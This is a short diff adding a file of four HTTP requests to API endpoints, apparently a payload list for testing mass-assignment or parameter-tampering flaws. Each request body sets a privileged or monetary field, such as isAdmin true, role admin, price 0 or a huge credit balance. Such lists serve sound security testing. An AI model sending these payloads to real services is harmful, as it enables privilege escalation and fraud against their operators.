@@ -1,0 +1,4 @@
+POST /api/user {"isAdmin":true}
+POST /api/order {"price":0}
+POST /api/register {"role":"admin"}
+PUT /api/profile {"credit":9999999}
